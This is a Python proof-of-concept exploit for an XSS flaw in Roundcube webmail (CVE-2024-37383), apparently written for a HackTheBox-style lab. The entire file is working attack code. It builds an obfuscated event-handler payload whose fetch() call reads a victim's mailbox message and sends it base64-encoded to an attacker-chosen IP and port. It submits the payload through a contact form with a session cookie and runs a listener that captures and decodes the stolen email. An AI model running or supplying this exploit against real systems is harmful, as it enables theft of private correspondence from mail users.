#!/usr/bin/env python3
"""
CVE-2024-37383-POC Exfiltration Script for Roundcube
-------------------------------------------------------
This script demonstrates a proof-of-concept for an XSS-based exfiltration (as seen
in CVE-2024-37383). It injects an XSS payload into a vulnerable endpoint and then
spins up a listener to capture the exfiltrated data.

Usage:
    python3 exfiltrate.py --target http://things.htb/contact \
                          --cookie "your_session_cookie_here" \
                          --dest-ip 10.10.10.x \
                          --dest-port 8000 \
                          [--uid 4] \
                          [--listen-ip 0.0.0.0] \
                          [--listen-port 8000]
"""

import argparse
import base64
import threading
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from lxml import html
import os,sys,re

def parse_args():
    """
    Parse command-line arguments.

    Returns:
        Namespace: Parsed arguments including target URL, cookie, UID, listener IP/port, and exfil callback IP/port.
    """
    parser = argparse.ArgumentParser(description="CVE-2024-37383-POC Exfiltration Script for Roundcube")
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://mail.things.org/support)')
    parser.add_argument('--cookie', required=True, help='Session cookie value for authentication')
    parser.add_argument('--uid', default='4', help='User ID to target (default: 4)')
    parser.add_argument('--listen-ip', default='0.0.0.0', help='IP address for the exfiltration listener (default: 0.0.0.0)')
    parser.add_argument('--listen-port', type=int, default=8000, help='Port for the exfiltration listener (default: 8000)')
    parser.add_argument('--dest-ip', required=True, help='Destination IP for exfiltration callback (reverse shell / data exfiltration)')
    parser.add_argument('--dest-port', type=int, required=True, help='Destination port for exfiltration callback')
    return parser.parse_args()

def bld_pld(uid, d_ip, d_port):
    """
    Build the XSS payload for data exfiltration.

    This payload uses the onanimationstart event to trigger a fetch() request that grabs the
    mail content and sends it (after base64 encoding) to our controlled listener.

    Args:
        uid (str): User ID to target.
        d_ip (str): Destination IP for exfiltration.
        d_port (int): Destination port for exfiltration.

    Returns:
        str: The complete payload string.
    """
    # These variable names have been slightly obfuscated.
    part1 = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
    part2 = str(uid)
    part3 = f'&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://{d_ip}:{d_port}/c=${{btoa(t)}}`)) foo=bar">Foo</body>'
    return f"{part1}{part2}{part3}"

def snd_pld(url, pld, hdrs):
    """
    Send the XSS payload via an HTTP POST request.

    Args:
        url (str): The target URL.
        pld (str): The payload string.
        hdrs (dict): Dictionary of HTTP headers to include.
    
    Returns:
        int: The HTTP response status code.
    """
    data = {
        'name': 'asdf',
        'email': 'asdf',
        'message': pld,
        'content': 'html',
        'recipient': 'bcase@drip.htb'
    }
    r = requests.post(url, data=data, headers=hdrs)
    print(f"[+] POST Request Sent! Status Code: {r.status_code}")
    return r.status_code

class XHShndlr(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler to capture and decode exfiltrated data.
    """
    def do_GET(self):
        """
        Process GET requests, decode base64 data, and print the extracted content.
        """
        if '/c=' in self.path:
            try:
                enc = self.path.split('/c=')[1]
                dec = base64.b64decode(enc).decode('latin-1')
                print(f"[+] Received data:\n{dec}")
                tree = html.fromstring(dec)
                # Try to find an element with id 'messagebody'
                mb = tree.xpath('//div[@id="messagebody"]')
                if mb:
                    print("[+] Extracted Message Body Content:")
                    print(mb[0].text_content().strip())
                else:
                    print("[!] No element with id 'messagebody' found.")
            except Exception as ex:
                print(f"[!] Error processing exfiltrated data: {ex}")
        else:
            print("[!] Received request but no exfil data found.")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, fmt, *args):
        # Suppress default logging.
        return

def start_listener(l_ip, l_port):
    """
    Start an HTTP server to listen for exfiltrated data.

    Args:
        l_ip (str): IP address to bind the listener.
        l_port (int): Port to bind the listener.
    """
    addr = (l_ip, l_port)
    srv = HTTPServer(addr, XHShndlr)
    print(f"[+] Listening on {l_ip}:{l_port} for exfiltrated data...")
    srv.serve_forever()

def main():
    """
    Main function: parses arguments, constructs the payload, starts the listener, and sends the payload.
    """
    args = parse_args()

    # Construct the target domain from the target URL.
    try:
        target_host = args.target.split('/')[2]
    except IndexError:
        print("[!] Invalid target URL format. Ensure it includes a scheme (http:// or https://)")
        sys.exit(1)

    # Build HTTP headers using the provided cookie and target information.
    hdrs = {
        'Host': target_host,
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': f'http://{target_host}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': f'http://{target_host}/index',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'session={args.cookie}',
        'Connection': 'close'
    }

    # Build the obfuscated payload.
    pld = bld_pld(args.uid, args.dest_ip, args.dest_port)
    print(f"[DEBUG] Constructed payload:\n{pld}")

    # Start the listener in a separate thread.
    listener = threading.Thread(target=start_listener, args=(args.listen_ip, args.listen_port))
    listener.daemon = True
    listener.start()

    # Send the payload to the target.
    snd_pld(args.target, pld, hdrs)

    # Keep the main thread alive until interrupted.
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[+] Stopping listener.")

if __name__ == '__main__':
    main()
